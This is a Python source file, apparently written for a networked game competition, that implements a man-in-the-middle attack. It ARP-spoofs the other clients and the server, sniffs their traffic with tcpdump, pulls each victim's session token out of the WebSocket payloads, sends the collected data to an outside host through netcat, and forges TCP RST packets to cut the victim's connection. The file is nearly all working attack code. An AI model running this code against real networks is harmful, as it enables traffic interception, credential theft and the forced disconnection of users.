import json
import numpy as np
import logging
import os
import socket
import subprocess
import sys
from sys import stderr, stdout
from threading import Thread
import time
from typing import Optional
import netifaces
from decode_ws import decodedCharArrayFromByteStreamIn
from scapy.all import rdpcap, send, IP, TCP
from utils import saiblo

# logging.basicConfig(level=logging.INFO)

def get_ip_address_service(service_name) -> Optional[str]:
    try:
        # Get the host name to IP resolution
        ip_address = socket.gethostbyname(service_name)
        return ip_address
    except socket.gaierror:
        return None

def get_ip_address_interface(interface) -> Optional[str]:
    try:
        # Get the addresses associated with the given interface
        addresses = netifaces.ifaddresses(interface)
        # Extract the IP address from the AF_INET family
        ip_address = addresses[netifaces.AF_INET][0]['addr']
        return ip_address
    except (KeyError, IndexError):
        return None

def get_hostname(ip_address) -> Optional[str]:
    try:
        # Attempt to resolve the IP address to a hostname
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        # print(f"The hostname for IP address {ip_address} is: {hostname}")
        return hostname
    except socket.herror:
        # print(f"Unable to resolve hostname for IP address {ip_address}")
        return None

def send_tcp_rst(src_ip, src_port, dst_ip, dst_port, seq_num):
    # Create an IP layer
    ip_layer = IP(src=src_ip, dst=dst_ip)

    # Create a TCP layer with the RST flag set
    tcp_layer = TCP(sport=src_port, dport=dst_port, seq=seq_num, flags='R')

    # Combine the IP and TCP layers into a single packet
    rst_packet = ip_layer / tcp_layer

    # Send the packet
    send(rst_packet, verbose=False)
    # print(f"Sent TCP RST packet from {src_ip}:{src_port} to {dst_ip}:{dst_port} with sequence number {seq_num}",
    #       file=stdout,
    #       flush=True)

class MITM:

    def __init__(self, server: str):
        start_t = time.time()
        self.hacker_addr = get_ip_address_interface('eth0')
        client0 = get_ip_address_service('client0')
        client1 = get_ip_address_service('client1')
        client2 = get_ip_address_service('client2')
        self.server_addr = get_ip_address_service('server')
        if client0 and client1 and self.server_addr and not client2:
            # Is solo
            clients_addr = [client0, client1]
            clients_addr.remove(self.hacker_addr)
        else:
            self.server_addr = server.replace("ws://", "").split(":")[0]
            if self.server_addr.count(".") < 3:
                self.server_addr = get_ip_address_service(self.server_addr)
            pref = self.hacker_addr.rsplit('.', maxsplit=1)[0]
            clients_addr = []
            cnt_fail = 0
            for i in range(2, 255):
                addr = f"{pref}.{i}"
                if addr == self.hacker_addr or addr == self.server_addr:
                    continue
                host = get_hostname(addr)
                if not saiblo:
                    print(f"Addr: {addr}  Host: {host}", file=stderr, flush=True)
                if host:
                    clients_addr.append(addr)
                    cnt_fail = 0
                else:
                    cnt_fail += 1
                    if cnt_fail >= 10:
                        break
        if not saiblo:
            print(f"Server address: {self.server_addr}", file=stderr)
            print(f"My address: {self.hacker_addr}", file=stderr)
            print(f"Clients addresses: {clients_addr}", file=stderr)
        self.victim_pcap = "victim.pcap"  # Packets from victim to server
        self.server_pcap = "server.pcap"  # Packets from server to victim
        if len(clients_addr) > 1:
            print("Multiplayer")
            self.is_multi = True
            self.victim_addr = None
            self.enemies_addr = clients_addr
            cmd = ["arpspoof"]
            for addr in clients_addr:
                cmd.append("-t")
                cmd.append(addr)
            cmd.append(self.server_addr)
            self.arpspoof = subprocess.Popen(cmd,
                                             stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE)
            cmd = ["tcpdump", "-n", "-w", self.victim_pcap, "-U",
                   "dst", "host", self.server_addr, "and",
                   "src", "host", "not", self.hacker_addr]
            self.tcpdump = subprocess.Popen(cmd,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
            self.addr_to_token = dict()
            self.victim_token = None
        elif len(clients_addr) == 1:
            print("Solo")
            self.is_multi = False
            self.victim_addr = clients_addr[0]
            if not saiblo:
                print(f"Victim address: {self.victim_addr}", file=stderr)
            self.arpspoof = subprocess.Popen(["arpspoof", "-t", self.victim_addr, "-r", self.server_addr],
                                             stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE)
            self.timer = time.time()
            # time.sleep(1)
            self.tcpdump = subprocess.Popen(["tcpdump", "-n", "-w", self.victim_pcap, "-U", "src", "host", self.victim_addr],
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
            cmd = ["tcpdump", "-n", "-w", self.server_pcap, "-U",
                   "src", "host", self.server_addr, "and",
                   "dst", "host", self.victim_addr]
            self.rev_tcpdump = subprocess.Popen(cmd,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE)
            # self.tcpdump.kill()
            self.victim_token = None
            self.victim_port = None
        else:
            print("Failed to get clients")
            logging.error("Failed to get clients addresses")
        print(f"Network init time: {time.time() - start_t}")

    def collect_info(self):
        # print("Start transferring")
        # print(f"arpspoof:")
        self.arpspoof.kill()
        self.tcpdump.kill()
        # print(f"{self.arpspoof.stdout.read()}")
        # print(f"{self.arpspoof.stderr.read()}")
        # print(f"tcpdump:", file=stderr)
        # print(f"{self.tcpdump.stdout.read()}")
        # print(f"{self.tcpdump.stderr.read()}")
        # stderr.flush()
        # stdout.flush()
        target = os.getenv("BASE_ADDR")
        port = os.getenv("BASE_PORT")

        info = {
            "hacker_addr": self.hacker_addr,
            "victim_addr": self.victim_addr,
            "victim_token": self.victim_token,
        }

        with open("tmp.txt", "w") as fp:
            json.dump(info, fp, indent=4)

        os.system(f"cat tmp.txt | nc {target} {port}")
        # print(f"Filesize: {subprocess.getoutput('du -h capture.pcap')}")
        # print("Dumping")
        # stdout.flush()
        # s = subprocess.getoutput("tcpdump -r capture.pcap -A -n")
        # print("Dumped")
        # stderr.flush()
        # info = []
        # for line in s.split('\n'):
        #     if 'TOKEN' in line:
        #         info.append(line)
        # with open("tmp.txt", "w") as fp:
            # fp.writelines(info)
            # fp.write(s)
        # os.system(f"cat capture.pcap | nc {target} {port}")
        # print("Transferred")
        # stderr.flush()
        # while True: time.sleep(1)

    def get_token(self, timeout: Optional[float] = None) -> bool:
        try:
            print("TK fuck", flush=True)
            logging.info("TK fuck")
            start_t = time.time()
            while not os.path.exists(self.victim_pcap):
                time.sleep(0.1)
                elaps = time.time() - start_t
                # print("tcpdump not detected", file=stderr, flush=True)
                if timeout and elaps >= timeout:
                    return False
                # print(subprocess.getoutput("ls"), file=stderr, flush=True)
            print("Opened", flush=True)
            logging.info("TK opened")
            # print("tcpdump opened", file=stderr, flush=True)
            # print(f"IP value: {IP}", file=stderr, flush=True)
            # print(f"TCP value: {TCP}", file=stderr, flush=True)
            while not self.victim_token:
                for packet in rdpcap(self.victim_pcap, count=1000):
                    try:
                        if not (IP in packet and TCP in packet):
                            # print("Not IP or TCP", file=stderr)
                            continue
                        ip_layer = packet[IP]
                        tcp_layer = packet[TCP]

                        # Extract source and destination IP addresses
                        src_ip = ip_layer.src
                        dst_ip = ip_layer.dst

                        # Extract TCP sequence number
                        seq_num = tcp_layer.seq

                        # Extract payload data if available
                        if getattr(tcp_layer, 'payload', None):

                            # print(tcp_layer.payload, file=stderr)
                            text = decodedCharArrayFromByteStreamIn(bytes(tcp_layer.payload))
                            # data = bytes(tcp_layer.payload).decode('utf-8', errors='ignore') if tcp_layer.payload else None

                            if not saiblo:
                                print(f"Source IP: {src_ip}", file=stderr)
                                print(f"Destination IP: {dst_ip}", file=stderr)
                                print(f"Sequence Number: {seq_num}", file=stderr)
                            self.victim_port = tcp_layer.sport
                            self.server_port = tcp_layer.dport
                            if text:
                                # print(f"text: {text}", file=stderr)
                                data = json.loads(text)
                                if self.is_multi:
                                    self.addr_to_token[src_ip] = data["token"]
                                    if len(self.addr_to_token) == len(self.enemies_addr):
                                        print(f"All {len(self.addr_to_token)} collected")
                                        return True
                                    # print(f"{len(self.addr_to_token)} tokens collected. Total: {len(self.enemies_addr)}",
                                    #       file=stderr,
                                    #       flush=True)
                                else:
                                    self.victim_token = data["token"]
                                    if not saiblo:
                                        print(f"Victim token: {self.victim_token}", flush=True)
                            # else:
                            #     print("No data", file=stderr)
                    except Exception as e:
                        print(f"Error: {sys.exc_info()[-1].tb_lineno}", flush=True)
                    # stderr.flush()
                time.sleep(0.1)
                elaps = time.time() - start_t
                if timeout and elaps >= timeout:
                    return self.is_multi and self.addr_to_token  # Return True if at least one of them is successful
                # print(f"TK Elapsed {elaps}", flush=True)
            print(f"TK time: {time.time() - start_t}", flush=True)
            # logging.info("TK time: %f", time.time() - start_t)
            return True
        except Exception as e:
            print(f"Error TK: {e}")
        return False

    def get_rev(self) -> bool:
        try:
            last_seq = None
            last_ack = None
            for packet in rdpcap(self.server_pcap):
                if not (IP in packet and TCP in packet):
                    continue
                ip_layer = packet[IP]
                tcp_layer = packet[TCP]

                # Extract source and destination IP addresses
                src_ip = ip_layer.src
                dst_ip = ip_layer.dst

                # Extract TCP sequence number
                seq_num = tcp_layer.seq
                ack_num = tcp_layer.ack
                self.server_port = tcp_layer.sport
                self.victim_port = tcp_layer.dport
                print(f"Seq {seq_num}  Ack {ack_num}")
                if seq_num:
                    last_seq = seq_num
                if ack_num:
                    last_ack = ack_num
            print(f"Last ack: {last_ack}")
            if last_ack:
                return True
            return False
        except Exception as e:
            print(f"Error rev: {e}")
        return False


    def disconnect_victim(self):
        # os.system(f"iptables -A FORWARD -s {self.victim_addr} -d {self.server_addr} -j DROP")
        # print(f"Disconnecting victim", file=stderr)
        # self.arpspoof.kill()
        # self.arpspoof = subprocess.Popen(["arpspoof", "-t", self.victim_addr, "172.2.3.4"],
        #                                  stdout=subprocess.PIPE,
        #                                  stderr=subprocess.PIPE)
        pass

    def disconnect_victim_c(self):
        def disconnect():
            last_last_ack = None
            cnt_repeat = 0
            while True:
                last_seq = None
                last_ack = None
                for packet in rdpcap(self.server_pcap):
                    if TCP in packet:
                        seq_num = packet[TCP].seq
                        if seq_num:
                            last_seq = seq_num
                        ack_num = packet[TCP].ack
                        if ack_num:
                            last_ack = ack_num
                if not last_ack:
                    logging.error("No last ack")
                else:
                    if last_last_ack == last_ack:
                        cnt_repeat += 1
                        if cnt_repeat >= 5:
                            break
                    else:
                        last_last_ack = last_ack
                        cnt_repeat = 0
                    print(f"Last ack: {last_ack}", flush=True)
                    # send_tcp_rst(src_ip=self.server_addr,
                    #              dst_ip=self.victim_addr,
                    #              src_port=self.server_port,
                    #              dst_port=self.victim_port,
                    #              seq_num=last_seq + np.random.randint(100))
                    try:
                        # l = last_seq + np.random.randint(1500)
                        # r = l + 100
                        # send_tcp_rst(src_ip=self.server_addr,
                        #              dst_ip=self.victim_addr,
                        #              src_port=self.server_port,
                        #              dst_port=self.victim_port,
                        #              seq_num=range(l, r))

                        l = last_ack + np.random.randint(1500)
                        r = l + 200
                        send_tcp_rst(src_ip=self.victim_addr,
                                     dst_ip=self.server_addr,
                                     src_port=self.victim_port,
                                     dst_port=self.server_port,
                                     seq_num=range(l, r))
                    except:
                        pass
                time.sleep(0.5)
        self.disconnect_thread = Thread(target=disconnect)
        self.disconnect_thread.start()

    def exit(self):
        self.tcpdump.kill()
        self.arpspoof.kill()
        if hasattr(self, "disconnect_thread"):
            pass




